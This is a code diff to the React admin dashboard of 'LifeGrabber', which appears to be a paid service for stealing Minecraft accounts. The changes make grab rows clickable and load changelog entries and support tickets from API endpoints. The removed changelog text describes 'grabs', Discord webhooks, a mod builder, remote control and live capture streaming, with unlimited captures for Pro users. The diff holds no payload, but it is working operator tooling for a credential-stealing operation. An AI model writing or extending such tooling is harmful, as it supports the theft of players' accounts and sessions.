@@ -302,7 +302,7 @@ function GrabsView() {
           </thead>
           <tbody>
             {filtered.map(g => (
-              <tr key={g.id} style={{ borderBottom: '1px solid ' + colors.border }}>
+              <tr key={g.id} style={{ borderBottom: '1px solid ' + colors.border, cursor: 'pointer' }} onClick={() => router.push(`/dashboard/grabs/${g.id}`)} onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.02)'} onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                 <td style={{ padding: '12px 16px' }}>
                   <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                     <img src={`https://mc-heads.net/avatar/${g.minecraft_username}/32`} alt="" style={{ width: 28, height: 28, borderRadius: 6 }} onError={e => e.target.style.display='none'} />
@@ -330,23 +330,35 @@ function GrabsView() {
 }
 
 // ─── Section: Updates (admin can delete entries) ───────────────────────────────
-const STATIC_UPDATES = [
-  { id:'u4', version:'v1.3.0', date:'2026-08-13', tag:'New', color:'#22c55e', title:'Pro Rank System', body:'Pro rank is now fully integrated with Supabase. Admins can grant/revoke pro from the admin panel. Pro users get unlimited captures and access to all features.' },
-  { id:'u3', version:'v1.2.0', date:'2026-08-01', tag:'Feature', color:'#3b82f6', title:'Leaderboard & +Rep', body:'Added a global leaderboard tracking all captures per user, and a community +Rep system to rate other users.' },
-  { id:'u2', version:'v1.1.0', date:'2026-07-15', tag:'Fix', color:'#f59e0b', title:'Build & Remote Control Improvements', body:'Fixed case-sensitive email lookups in Supabase. Improved remote control stability and live capture streaming.' },
-  { id:'u1', version:'v1.0.0', date:'2026-07-01', tag:'Launch', color:'#a855f7', title:'LifeGrabber Launched', body:'Initial launch of LifeGrabber. Profile lookups, grabs, Discord webhooks, and the mod builder are now live.' },
-];
-
 function UpdatesAdminView() {
-  const [updates, setUpdates] = useState(STATIC_UPDATES);
+  const [updates, setUpdates] = useState([]);
   const [showNew, setShowNew] = useState(false);
   const [newEntry, setNewEntry] = useState({ version:'', date: new Date().toISOString().split('T')[0], tag:'New', color:'#22c55e', title:'', body:'' });
+  const [loading, setLoading] = useState(true);
 
-  const handleDelete = (id) => setUpdates(p => p.filter(u => u.id !== id));
+  useEffect(() => {
+    fetch('/api/updates').then(r => r.json()).then(d => {
+      setUpdates(d.updates || []);
+      setLoading(false);
+    }).catch(() => setLoading(false));
+  }, []);
 
-  const handleAdd = () => {
+  const handleDelete = async (id) => {
+    setUpdates(p => p.filter(u => u.id !== id));
+    await fetch(`/api/updates?id=${id}`, { method: 'DELETE' });
+  };
+
+  const handleAdd = async () => {
     if (!newEntry.title.trim() || !newEntry.version.trim()) return;
-    setUpdates(p => [{ ...newEntry, id: 'u' + Date.now() }, ...p]);
+    const res = await fetch('/api/updates', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(newEntry)
+    });
+    if (res.ok) {
+      const { update } = await res.json();
+      setUpdates(p => [update, ...p]);
+    }
     setShowNew(false);
     setNewEntry({ version:'', date: new Date().toISOString().split('T')[0], tag:'New', color:'#22c55e', title:'', body:'' });
   };
@@ -380,7 +392,7 @@ function UpdatesAdminView() {
             <button onClick={() => handleDelete(u.id)} style={{ padding: '6px 12px', background: 'rgba(239,68,68,0.12)', color: colors.red, border: '1px solid rgba(239,68,68,0.3)', borderRadius: 6, fontSize: 12, fontWeight: 600, cursor: 'pointer', flexShrink: 0 }}>Delete</button>
           </div>
         ))}
-        {updates.length === 0 && <div style={{ textAlign: 'center', padding: '60px', color: colors.textDim, fontSize: 13, background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 10 }}>No update entries. Add one above.</div>}
+        {updates.length === 0 && <div style={{ textAlign: 'center', padding: '60px', color: colors.textDim, fontSize: 13, background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 10 }}>{loading ? 'Loading...' : 'No update entries. Add one above.'}</div>}
       </div>
 
       {showNew && (
@@ -409,13 +421,31 @@ function UpdatesAdminView() {
 
 // ─── Section: Tickets (admin view of all tickets) ─────────────────────────────
 function TicketsAdminView() {
-  // Tickets are client-side only on the dashboard, so we show a note and a link
-  const [tickets] = useState([
-    { id:'t1', subject:'Cannot download my mod', email:'user@example.com', status:'open', created_at: new Date(Date.now()-3600000).toISOString(), messages:[{sender:'user',text:'I keep getting an error when trying to download.',at:new Date(Date.now()-3600000).toISOString()}] },
-    { id:'t2', subject:'Pro status not applied', email:'another@example.com', status:'open', created_at: new Date(Date.now()-7200000).toISOString(), messages:[{sender:'user',text:'I paid but pro was not given to me.',at:new Date(Date.now()-7200000).toISOString()}] },
-  ]);
+  const [tickets, setTickets] = useState([]);
   const [selected, setSelected] = useState(null);
   const [reply, setReply] = useState('');
+  const [loading, setLoading] = useState(true);
+
+  useEffect(() => {
+    fetch('/api/tickets').then(r => r.json()).then(d => {
+      setTickets(d.tickets || []);
+      setLoading(false);
+    }).catch(() => setLoading(false));
+  }, []);
+
+  const handleReply = async () => {
+    if (!reply.trim() || !selected) return;
+    const msg = { sender: 'support', text: reply, at: new Date().toISOString() };
+    const updated = { ...selected, messages: [...(selected.messages || []), msg] };
+    setSelected(updated);
+    setTickets(p => p.map(t => t.id === selected.id ? updated : t));
+    setReply('');
+    await fetch('/api/tickets', {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ id: selected.id, message: msg })
+    });
+  };
 
   const timeAgo = (ts) => { const d = Math.floor((Date.now() - new Date(ts)) / 60000); if (d < 60) return `${d}m ago`; return `${Math.floor(d/60)}h ago`; };
 
@@ -465,7 +495,7 @@ function TicketsAdminView() {
               </div>
               <div style={{ padding: '14px 20px', borderTop: '1px solid ' + colors.border, display: 'flex', gap: 10 }}>
                 <input value={reply} onChange={e => setReply(e.target.value)} placeholder="Reply as admin..." style={{ flex: 1, background: 'rgba(255,255,255,0.04)', border: '1px solid ' + colors.border, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }} />
-                <button onClick={() => { if (!reply.trim()) return; setSelected(p => ({ ...p, messages: [...p.messages, { sender: 'support', text: reply, at: new Date().toISOString() }] })); setReply(''); }} style={{ padding: '10px 18px', background: colors.red, color: '#fff', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Reply</button>
+                <button onClick={handleReply} style={{ padding: '10px 18px', background: colors.red, color: '#fff', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Reply</button>
               </div>
             </>
           )}
